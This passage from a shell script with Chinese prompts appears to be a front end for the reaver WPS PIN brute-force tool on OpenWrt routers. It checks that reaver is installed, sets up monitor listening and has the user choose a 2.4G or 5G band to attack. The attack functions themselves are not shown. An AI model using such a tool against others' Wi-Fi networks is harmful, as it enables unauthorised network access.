    echo -e "\n${rojo}没有找到reaver工具，请安装后再执行此脚本${none}\n"
    exit
fi

check_monitor

user_select=$(uci show | grep wireless.radio[0,1,2]=wifi | wc -l)
if [[ -z ${user_select} ]];then
    echo ""
    echo -e "\e[1;31m扫描不到无线设备\e[0m" && exit
    echo ""
fi
if [ "${user_select}" == "1" ]
then
    add_listen 4
    echo -e "\n${yellow}正在等待配置生效. . .${none}\n"
    sleep 5
    check_wirles
elif [ "$(echo ${user_select} | grep [23])" != "" ]
then
    while true
    do
        echo -e "\033[?25h"
        clear
        echo -e "\n${yellow}选择pin的频段${none}"
        echo ""
        echo -e "${yellow}1、2.4G频段${none}"
        echo ""
        echo -e "${yellow}2、5G频段${none}"
        echo ""
        [[ "${user_select}" == "3" ]] && echo -e "${yellow}3、抓取另一个5G频段的包${none}\n"
        echo -en "${magenta}请选择输入序列号【按q退出】：${none}"
        read select_packe
        [[ "${select_packe}" == "q" ]] && exit
        if [ "${select_packe}" == "1" ]
        then
            add_listen 2
            check_wirles
        elif [ "${select_packe}" == "2" ]
        then
            add_listen 5
            check_wirles
        elif [ "${select_packe}" == "3" ]
        then
            add_listen 6
            check_wirles
        else
            read -sp "请按照提示输入"
            continue
        fi
        break
    done
fi

get_wifi

while true
do  
    menu
    if [ $? != 0 ];then
        continue
    fi
done